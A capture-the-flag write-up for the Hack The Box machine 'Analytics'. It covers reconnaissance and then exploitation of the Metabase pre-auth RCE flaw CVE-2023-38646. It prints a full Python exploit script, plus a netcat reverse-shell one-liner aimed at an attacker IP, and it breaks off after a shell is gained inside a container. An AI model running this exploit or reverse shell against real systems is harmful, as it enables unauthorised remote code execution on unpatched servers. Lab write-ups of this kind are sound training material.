# Box: Analytics
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.72.97 -v -p- -T4```

```
```
From our scan we have 2 open ports, port 22 which runs ssh and port 80 which runs http. Our enumeration today will be focused on port 80.



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d3d74bd8-0a57-4128-9e59-86306d4f83cb)

Lets add that to our ```/etc/hosts``` file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/analytics]
└─$ sudo nano /etc/hosts      
[sudo] password for bl4ck4non: 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/analytics]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       bl4ck4non-sec

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.129.72.96 analytical.htb
```
Going back to the webpage,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/69270f11-6834-464a-9a71-14cbcab1f1a9)

Trying to login, I saw this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/99a466c8-7913-442b-ac12-d4f133ef79e6)

Add the subdomain to the ```/etc/hosts``` file.

Now, lets navigate back to that subdomain

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a94b256f-1ab5-4ef2-b0cb-56b8ad6862f2)

Doing my research I saw that there's a recent exploit for ```metabase```. Lets exploit hehe


# Exploitation

You can check out this [blog](https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396), if you need an in-depth knowledge.]

First thing to do is grab our set-up token from the api endpoint ```/api/session/properties```.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35f17142-a140-42f4-8ac7-69d024618bd1)

Lets capture this request on burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/934c1a33-24b2-4ff3-b982-690b8b7498aa)

cool, we got the token. 

We'll be using this python script to get RCE

```python
from argparse import ArgumentParser
from string import ascii_uppercase

import base64
import random
import requests


def encode_command_to_b64(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()

    return encoded_payload


parser = ArgumentParser('Metabase Pre-Auth RCE Reverse Shell', 'This script causes a server running Metabase (< 0.46.6.1 for open-source edition and < 1.46.6.1 for enterprise edition) to execute a command through the security flaw described in CVE 2023-38646')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-t', '--token', type=str, required=True, help='Setup Token from /api/session/properties')
parser.add_argument('-c', '--command', type=str, required=True, help='Command to be execute in the target host')

args = parser.parse_args()

print('[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]\n')

print('[+] Initialized script')

print('[+] Encoding command')

command = encode_command_to_b64(args.command)

url = f'{args.url}/api/setup/validate'

headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}

payload = {
    "token": args.token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), command=command),
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

print('[+] Making request')

request = requests.post(url, json=payload, headers=headers)

print('[+] Payload sent')`
```
Save this in a file, say "exploit.py".

To run the script, we just need the target url and the setup token. We'll also include our payload we want to execute. I'll be susing this payload ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc LHOST LPORT >/tmp/f```, ensure you set your ```LHOST``` and ```LPORT```. Also, set up your netcat listener

Now, lets run the script

command:```python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.61 1234 >/tmp/f"```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/23bd10bd-393f-4583-bd90-d1868637580c)

nice nice, we spawned a shell as user ```metabase```.

You can use the below commands to stabilize the shell

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```
Well, this ain't working😂. Just realized now that we are in a docker container























